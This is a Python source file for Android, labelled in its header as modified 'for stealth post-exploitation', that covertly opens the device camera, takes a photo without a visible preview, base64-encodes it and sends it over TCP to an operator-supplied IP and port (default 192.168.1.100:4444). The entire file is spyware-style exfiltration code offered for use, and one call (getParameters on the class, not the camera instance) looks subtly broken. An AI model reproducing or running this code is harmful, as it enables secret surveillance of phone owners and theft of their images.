#!/usr/bin/env python
# -*- coding: utf-8 -*-
# Copyright (c) 2025, Modified by intframework for stealth post-exploitation

from jnius import autoclass, PythonJavaClass, java_method
from threading import Event
import socket
import base64
import argparse

__all__ = ["capture_and_send_image"]

class CameraCallback(PythonJavaClass):
    __javainterfaces__ = ['android/hardware/Camera$PictureCallback']

    def __init__(self, event):
        PythonJavaClass.__init__(self)
        self.result = None
        self.event = event

    @java_method("([BLandroid/hardware/Camera;)V")
    def onPictureTaken(self, data, camera):
        self.result = data.tostring()
        self.event.set()

def get_camera_count():
    try:
        Camera = autoclass("android.hardware.Camera")
        return Camera.getNumberOfCameras()
    except:
        return 0

def capture_and_send_image(cam_id=0, jpeg_quality=85, target_ip="192.168.1.100", target_port=4444):
    """Capture image and send it to the target system via TCP."""
    Camera = autoclass("android.hardware.Camera")
    camera_instance = Camera.open(cam_id)
    try:
        params = Camera.getParameters()
        params.setJpegQuality(jpeg_quality)
        camera_instance.setParameters(params)

        SurfaceTexture = autoclass("android.graphics.SurfaceTexture")
        camera_instance.setPreviewTexture(SurfaceTexture(0))
        camera_instance.startPreview()

        event = Event()
        callback = CameraCallback(event)
        camera_instance.takePicture(None, None, callback)
        event.wait()

        picture_data = callback.result
        encoded_picture = base64.b64encode(picture_data).decode('utf-8')

        # Send the image via TCP
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((target_ip, target_port))
            s.sendall(encoded_picture.encode('utf-8'))
            print(f"[INFO] Image sent to {target_ip}:{target_port}")

    finally:
        camera_instance.release()

def parse_arguments():
    """Parse command-line arguments."""
    parser = argparse.ArgumentParser(description="Capture an image and send it to the target system via TCP.")
    parser.add_argument("-ip", "--target-ip", type=str, required=True, help="Target IP address to send the image to.")
    parser.add_argument("-p", "--port", type=int, required=True, help="Target port to send the image to.")
    parser.add_argument("-c", "--camera-id", type=int, default=0, help="Camera ID to use (default is 0).")
    parser.add_argument("-q", "--quality", type=int, default=85, help="JPEG quality for the captured image (default is 85).")
    return parser.parse_args()

if __name__ == "__main__":
    # Parse arguments
    args = parse_arguments()

    # Triggering capture and send to the target system via TCP
    capture_and_send_image(cam_id=args.camera_id, jpeg_quality=args.quality, target_ip=args.target_ip, target_port=args.port)